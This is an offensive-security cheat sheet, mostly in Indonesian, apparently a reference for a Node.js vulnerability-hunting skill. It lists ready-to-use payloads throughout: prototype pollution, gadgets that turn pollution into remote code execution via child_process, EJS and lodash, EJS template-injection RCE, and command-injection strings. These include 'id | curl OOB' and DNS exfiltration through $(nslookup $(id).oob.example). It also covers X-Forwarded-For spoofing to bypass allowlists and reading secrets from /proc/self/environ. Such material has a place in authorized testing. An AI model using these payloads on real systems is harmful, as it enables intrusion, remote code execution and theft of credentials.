# Node.js Attack Battery — prototype pollution → RCE, trust-proxy, SSTI, command injection

Katalog eksekusi cepat untuk `hunt-nodejs`. SKILL.md sudah 7 phase + chain table; di sini battery
berjenjang + kill-signal + gadget table. Additive-only.

**Prinsip (dari SKILL.md):** prototype pollution yang hanya di-accept (200) tanpa sink = bukan
temuan. Bukti = polluted state REACH sink berikutnya (RCE/DoS/authz), bukan cuma payload diterima.

---

## Tier 0 — Fingerprint

```
Node/Express:  X-Powered-By: Express ; error stack "at /app/" ; package.json/node_modules expose
Error-based: kirim input invalid → stack trace leak versi modul (express, lodash, ejs, pug)
```

---

## Tier 1 — Prototype pollution detection

```
JSON body:   {"__proto__":{"polluted":"yes"}}
             {"constructor":{"prototype":{"polluted":"yes"}}}
qs query:    ?__proto__[polluted]=yes&__proto__[admin]=true
confirm: request berikutnya reflect polluted key → pollution BENER terjadi
```

**Negative control (wajib):** kirim key non-`__proto__` → pastikan behavior beda. Kalau semua
sama di-drop = filtered, bukan bug.

---

## Tier 2 — Prototype pollution → RCE gadget table

| Sink | Gadget (pollute property) | Signal |
|---|---|---|
| **child_process** | `{"__proto__":{"shell":"/bin/sh","argv0":"node","NODE_OPTIONS":"--require /proc/self/environ"}}` lalu ada spawn tanpa shell=false | RCE |
| **lodash template** | CVE-2021-23337: pollute `templateSettings` / `sourceURL` / `variable` | sintaks inject → RCE |
| **ejs** | pollute `opts.outputFunctionName` / `escapeXML` / `client` | RCE render template |
| **child_process execArgv** | pollute `execArgv` = `["--eval","require('child_process').execSync('id')"]` → `child_process.fork()` | RCE |
| **mongoose** | pollute `Blocked/Where` / `__proto__` di query | query/authz bypass |
| **express** | pollute `settings['view options']` → `outputFunctionName` | RCE di render |

**Kill-signal:** OOB callback / `id`/`whoami` dari worker = RCE.

---

## Tier 3 — Express trust proxy abuse (rate-limit / allowlist bypass)

```
Express punya `app.set('trust proxy', ...)` → X-Forwarded-For dipercaya.
spoof 127.0.0.1 → bypass localhost allowlist
spoof internal range → reach internal-only route
rotate XFF → bypass IP rate limit
```

**Kill-signal:** route/limit yang seharusnya per-IP diprotect → bypass via spoof header.

---

## Tier 4 — Template engine SSTI (EJS / Pug / Handlebars)

```
EJS:      <%= 7*7 %> -> 49        (RCE: <%- global.process.mainModule.require('child_process').execSync('id') %>)
Pug:      wait untrustcek user input di template
Handlebars: prototype pollution via template helper, atau custom helper sink
```

**Kill-signal:** output command dieksekusi (bukan cuma echo payload). Chain ke `hunt-rce`.

---

## Tier 5 — child_process command injection

```
signal: /api/convert, /api/exec, /api/ping, /api/scan  (jalankan shell dengan user input)
test: id;whoami  atau  id | curl OOB, $(id), `id`, base64-encoded
OOB via DNS:  $(nslookup $(id).oob.example)
```

---

## Tier 6 — /proc/self/environ exfil (kalau LFI ada)

```
Node app LFI → /proc/self/environ → env vars (API key, secret, DB cred, JWT secret)
procfile/kubernetes: /proc/1/cmdline, /proc/self/cmdline, /proc/self/fd/*
```

---

## Chain table (prototype pollution → impact)

| Primitive | Chain | Impact |
|---|---|---|
| __proto__ diterima | child_process gadget | RCE |
| __proto__ diterima | ejs/lodash template | RCE |
| __proto__ diterima | authz/query bypass (mongoose) | priv-esc |
| trust-proxy spoof | localhost allowlist | auth-bypass |
| command injection | shell exec | RCE |

## Refusal-pattern

- Pollution 200 tapi tak reach sink = bukan temuan (gadget wajib).
- `{{7*7}}` di raw HTML tapi tak render di DOM = tampilkan proof eksekusi.
- Spoof IP yang tak mengubah allowlist/limit = bukan bypass.
- Command "echo" tapi tak dieksekusi server = bukan RCE (butuh efek).